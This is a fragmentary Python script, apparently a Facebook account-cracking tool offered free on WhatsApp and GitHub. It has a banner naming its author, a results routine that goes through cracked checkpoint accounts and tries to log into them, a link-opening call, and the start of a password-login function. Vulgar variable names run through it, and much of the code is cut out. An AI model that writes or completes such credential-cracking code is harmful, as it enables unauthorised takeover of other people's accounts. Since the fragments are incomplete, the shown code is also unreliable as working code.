...
def logo():
 ...
 ╚═╝     ╚═╝╚══════╝   ╚═╝   ╚═╝  ╚═╝\n{N} ▌│█║▌║▌║META FACEBOOK METHOD║▌║▌║█│▌{N} """)
    print("╔════════════════════════════════════════╗")
    print(f"║{P}[{H}•{P}] Author    : MR.G/YOUTIA-X                {N}║")
    print(f"║{P}[{H}•{P}] Whatsapp  : 083841935817           {N}║")
    print(f"║{P}[{H}•{P}] Github    : github.com/MrYOUTIA{N}  ║")
    print(f"║{P}[{H}•{P}] SC Status : Gratis rasa {H}Premium{P}     {N}║")
    print(f"║{P}[{H}•{P}] Support   : 32/64bit                   {N}║")
    print(f"║{P}[{H}•{P}] Network   : {H}IM3{N}, {H}AXIS/XL{N}, {H}3{N}         ║")
    print(f"║{P}[{H}•{P}] SC Version: V-6.6 ({K}BETA{P})            {N}║")
    print("╚════════════════════════════════════════╝")
#CRACK SELESAI
def hasil(ok,cp):
    if len(ok) != 0 or len(cp) != 0:
        print(f'\n%s══════════════════════════════════════════\n [%s✓%s] %sCRACK BY ARYO-XD SC SELESAI...\n%s══════════════════════════════════════════'%(N,H,N,H,N))
        ...
        if cek_cp =="":
            ...
            for memek in cp:
                ...
                titid  = kontol.split(' • ')
                print(f'{N}══════════════════════════════════════════\n {H}LOGIN PROCESS')
                jalan(f' {N}[{M}?{N}] Account : {K}{kontol.replace("[ARYO-CP] ", "")}{N}')
                try:
                    log_hasil(titid[0].replace("[ARYO-CP] ", ""), titid[1])
...
def cek_pw():
    try:
        ...
        if pil =="":
            ...
            os.system('xdg-open https://wa.me/+6285696526470?text=Hallo+izin+menggunakan+SC+ini');time.sleep(2);cek_pw()
        elif pil in["1","01"]:
            print('%s══════════════════════════════════════════'%(N))
...
def login_passwod():
    ...
    user = input(f"\n {N}[{H}•{N}] Enter ID/Username : youtia{H}")
    pasw = input(f" {N}[{H}•{N}] Enter Password : youtia{H}")
    loading()
    try:
        session=requests.Session()
